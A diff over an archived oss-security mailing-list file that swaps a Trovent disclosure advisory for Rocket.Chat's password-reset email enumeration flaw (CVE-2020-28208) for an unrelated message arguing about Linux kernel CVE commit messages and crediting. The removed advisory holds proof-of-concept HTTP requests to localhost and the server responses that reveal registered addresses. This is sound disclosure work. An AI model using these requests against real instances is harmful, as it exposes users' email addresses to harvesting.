@@ -1,133 +1,94 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/01/13/1
-Message-ID: <6cl4XA2FNQGvOMHYmqYlBWrjc3DSOfedPrmY6jQiYx__CIGHh7C3oAUzgNUGz75ASJQ--eLeDFSHfhyNpmp4gCfz7iiB45fnXCeRTa-yjIs=@trovent.io>
-Date: Wed, 13 Jan 2021 08:29:38 +0000
-From: Stefan Pietsch <s.pietsch@...vent.io>
-To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>, "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>, "submissions@...ketstormsecurity.com" <submissions@...ketstormsecurity.com>
-Subject: Re: Trovent Security Advisory 2010-01 [updated] / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/03/19/12
+Message-ID: <20210319195825.GA28654@grsecurity.net>
+Date: Fri, 19 Mar 2021 15:58:25 -0400
+From: Brad Spengler <spender@...ecurity.net>
+To: oss-security@...ts.openwall.com
+Subject: Re: Re: CVE-2021-20219 Linux kernel: improper synchronization in flush_to_ldisc() can lead to DoS
 Content-Type: text/plain; charset=utf-8
 
-# Trovent Security Advisory 2010-01 #
-#####################################
+Hi Sasha,
 
+> I'm really not sure how to respond to this. I don't own upstream, my
+> name isn't Linus, Greg, nor do I maintain a major subsystem. I don't
+> have any control over how upstream commits look like.
 
-Email address enumeration in reset password
-###########################################
+Both you and Greg certainly have control over stable kernel commit
+messages (it's the same ability you use to add the upstream commit ID).
+Greg at least receives private notification of security vulnerabilities
+through security@...nel.org.  I've privately received several complaints
+from different researchers about what was lacking from commit messages
+for vulnerabilities they reported there.
 
+> Can you please stop complaining about Greg's mails as if I was the one
+> who wrote them? I'm not his alter-ego, twin, or so on. If you have a
+> concern with what he writes take it up with him.
 
-Overview
-########
+I wanted to avoid having to send multiple mails to the mailing list
+and cluttering it up even more (which is now unavoidable).
 
-Advisory ID: TRSA-2010-01
-Advisory version: 1.2
-Advisory status: Public
-Advisory URL: https://trovent.io/security-advisory-2010-01
-Affected product: Web application Rocket.Chat
-Affected version: <= 3.9.1
-Vendor: Rocket.Chat Technologies Corp., https://rocket.chat
-Credits: Trovent Security GmbH, Nick Decker, Stefan Pietsch
+But since I'm here, I'll also address an assertion Greg repeated today:
+https://seclists.org/oss-sec/2021/q1/242
+that RH had incorrectly credited the CVE, after it had been already
+pointed out here:
+https://seclists.org/oss-sec/2021/q1/225
+that the reporter had found a flaw in the backport of the original
+fix that had happened years ago.  This is not improper acknowledgement.
+If Greg wanted to ensure proper acknowledgement of a CVE for the *original*
+issue, he could have done that back in 2018 when he committed the
+original fix:
 
+commit 3d63b7e4ae0dc5e02d28ddd2fa1f945defc68d81
+Author:     Tetsuo Handa <penguin-kernel@...ove.SAKURA.ne.jp>
+AuthorDate: Sat May 26 09:53:13 2018 +0900
+Commit:     Greg Kroah-Hartman <gregkh@...uxfoundation.org>
+CommitDate: Thu Jun 28 21:30:16 2018 +0900
 
-Detailed description
-####################
+    n_tty: Fix stall at n_tty_receive_char_special().
 
-Trovent Security GmbH discovered an email address enumeration vulnerability
-in the password reset function of the chat application Rocket.Chat. This vulnerability lets
-an unauthorized user enumerate registered email addresses on the instance of Rocket.Chat.
+I'm in agreement that since the flaw was in the backport, it should have
+been attributed to RHEL, BTW.
 
-Severity: Medium
-CVSS Score: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
-CVE ID: CVE-2020-28208
-CWE ID: CWE-204
+> Great, let's work together on making it better, but it's been following
+> the same pattern for quite a while now.
 
+I think both you and Greg are exaggerating the level of "extra work" this
+temporary blip creates for you -- with the exception of the RH backport
+issue, it was not difficult at all for me to determine what issue was
+being discussed, without even having to plug the CVEs into bugzilla.redhat.com
+which produces:
+https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-35519
+https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2021-3428
+(though these are equally light on information)
 
-Proof of concept
-################
+Greg's annoyances on this list have been going on for far longer than these
+recent advisories, and are not specific even to RH advisories.  For instance,
+in the middle of his RH tirade, he posted this useless email about another
+set of issues:
+https://seclists.org/oss-sec/2021/q1/217
+It's not the concern of the list why the reporter did or did not provide the
+fixes upstream (at least two of which were already upstreamed).
 
-Sample HTTP request sent with a registered email address:
+We do not need more emails from Greg like:
+https://seclists.org/oss-sec/2021/q1/21
+"I still do not understand why you report issues that are fixed over a year ago"
+"Who does this help out"
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
-Host: localhost:3000
-Content-Length: 122
-Accept: */*
-Content-Type: application/json
+https://seclists.org/oss-sec/2021/q1/100
+"5.1.0 is _VERY_ old"
 
+https://seclists.org/oss-sec/2021/q1/233
+"Is that a mistake in your kernel development process that should be
+resolved?"
 
-{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"positive@...t.de\"],\"id\":\"3\"}"}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+They are as useless to this list as his boilerplate "all users must upgrade"
+stable announcements every 3 days.
 
-The server response to a valid email address:
+I'm hopeful that RH's advisories will return to their previous level of
+information (not "start" as Greg characterized it).  What can be said of
+upstream's policies that everyone's been putting up with for ~16 years now?
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-HTTP/1.1 200 OK
-X-XSS-Protection: 1
-X-Content-Type-Options: nosniff
-X-Frame-Options: sameorigin
-X-Instance-ID: DQDfuEfNLdbZr3zYH
-Cache-Control: no-store
-Pragma: no-cache
-content-type: application/json
-Vary: Accept-Encoding
-Date: Tue, 03 Nov 2020 12:01:25 GMT
-Connection: keep-alive
-Content-Length: 78
+Thanks,
+-Brad
 
-{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":true}","success":true}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-Sample HTTP request sent with a non registered email address:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
-Host: localhost:3000
-Content-Length: 119
-Accept: */*
-Content-Type: application/json
-
-
-{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"false@...t.de\"],\"id\":\"3\"}"}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-The server response to an invalid email address:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-HTTP/1.1 200 OK
-X-XSS-Protection: 1
-X-Content-Type-Options: nosniff
-X-Frame-Options: sameorigin
-X-Instance-ID: DQDfuEfNLdbZr3zYH
-Cache-Control: no-store
-Pragma: no-cache
-content-type: application/json
-Vary: Accept-Encoding
-Date: Tue, 03 Nov 2020 12:03:08 GMT
-Connection: keep-alive
-Content-Length: 79
-
-{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":false}","success":true}
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-Solution / Workaround
-#####################
-
-Ensure the application returns consistent generic server responses independent
-of the email address entered during the password reset process.
-
-Fixed in Rocket.Chat version 3.9.2, verified by Trovent.
-
-
-History
-#######
-
-2020-10-27: Vulnerability found
-2020-11-03: Advisory created and CVE ID requested
-2020-11-06: Vendor contacted and informed about planned disclosure date
-2020-11-06: Vendor confirmed vulnerability, working on a fix
-2021-01-07: Advisory published
-2021-01-08: Vendor sent us information about fixed version
-2021-01-13: Updated affected version (thanks @LorenzNickel), verified with 3.9.1
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (856 bytes)
+Download attachment "signature.asc" of type "application/pgp-signature" (837 bytes)
